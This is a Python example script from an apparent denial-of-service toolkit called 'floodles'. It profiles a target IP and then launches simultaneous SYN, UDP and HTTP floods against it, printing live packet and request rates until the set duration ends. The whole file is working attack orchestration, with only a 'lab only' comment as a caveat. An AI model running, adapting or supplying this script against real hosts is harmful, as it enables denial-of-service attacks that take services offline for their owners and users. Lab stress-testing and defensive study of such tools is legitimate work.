#!/usr/bin/env python3
"""
examples/multi_vector.py
Multi-vector attack example: SYN + UDP + HTTP simultaneously.

Demonstrates the Python API for orchestrating concurrent attack vectors.
Run in lab only. Requires root for raw socket modules.

Usage:
  sudo python3 examples/multi_vector.py --target 192.168.1.100 --duration 60
"""

import argparse
import time
import signal
import sys

# Add parent dir to path if running directly
import os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from floodles.modules import syn_flood, udp_flood, http_flood
from floodles.utils.logger import get_logger
from floodles.utils.profiler import profile as do_profile


def main():
    parser = argparse.ArgumentParser(description="Floodles multi-vector example")
    parser.add_argument("--target",   required=True, help="Target IP")
    parser.add_argument("--port",     type=int, default=80)
    parser.add_argument("--duration", type=int, default=60)
    parser.add_argument("--no-scan",  action="store_true", help="Skip profiling")
    args = parser.parse_args()

    # --- Pre-attack scan ---
    if not args.no_scan:
        print(f"[*] Profiling {args.target}...")
        result = do_profile(args.target, check_ntp=True)
        result.print_summary()
        print()

    # --- Launch vectors ---
    engines = []
    loggers = []

    print(f"[*] Launching multi-vector attack -> {args.target}  duration={args.duration}s\n")

    # Vector 1: SYN flood
    print("[+] Vector 1: SYN flood (L4)")
    log1 = get_logger("syn_flood", args.target, {"port": args.port})
    e1 = syn_flood.run(args.target, args.port, threads=16, duration=args.duration)
    engines.append(e1)
    loggers.append(log1)

    # Vector 2: UDP flood (random ports)
    print("[+] Vector 2: UDP flood (L4, 1400B)")
    log2 = get_logger("udp_flood", args.target, {"port": 0, "size": 1400})
    e2 = udp_flood.run(args.target, 0, payload_size=1400, threads=8, duration=args.duration)
    engines.append(e2)
    loggers.append(log2)

    # Vector 3: HTTP flood (only if port 80 is open)
    if args.port == 80:
        print("[+] Vector 3: HTTP flood (L7)")
        url = f"http://{args.target}/"
        log3 = get_logger("http_flood", url, {"concurrency": 500})
        e3 = http_flood.run(url, concurrency=500, duration=args.duration)
        engines.append(e3)
        loggers.append(log3)

    print(f"\n[*] {len(engines)} vectors active. Ctrl+C to stop early.\n")

    # --- Ctrl+C handler ---
    def _stop(sig, frame):
        print("\n[!] Stopping all vectors...")
        for e in engines:
            e.stop()

    signal.signal(signal.SIGINT, _stop)

    # --- Live stats loop ---
    start = time.time()
    while any(e.is_running() for e in engines):
        elapsed = time.time() - start
        line_parts = [f"t={elapsed:.0f}s"]
        for i, e in enumerate(engines):
            s = e.metrics.summary()
            if "packets" in s:
                line_parts.append(
                    f"v{i+1}: {s['live_pps']:,.0f}pps / {s['live_mbps']:.2f}Mbps"
                )
            elif "requests" in s:
                line_parts.append(f"v{i+1}: {s['avg_rps']:.0f}rps")
        print("\r" + "  |  ".join(line_parts), end="", flush=True)
        time.sleep(1)

    print("\n\n[+] All vectors finished.\n")

    # --- Final summaries ---
    for i, (e, log) in enumerate(zip(engines, loggers)):
        s = e.metrics.summary()
        log.stop(s)
        print(f"Vector {i+1}: {s}")


if __name__ == "__main__":
    main()
